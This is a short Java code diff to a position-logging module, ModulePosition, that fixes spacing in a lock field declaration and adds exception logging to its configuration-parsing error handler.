@@ -58,7 +58,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 	private LogR logIncrGPS, logIncrCell;
 	private Object logGPSlock = new Object();
 	private Object logCelllock = new Object();
-	private Object logWifilock= new Object();
+	private Object logWifilock = new Object();
 
 	@Override
 	public void actualStart() {
@@ -123,6 +123,10 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			cellEnabled = conf.getBoolean("cell");
 			wifiEnabled = conf.getBoolean("wifi");
 		} catch (ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
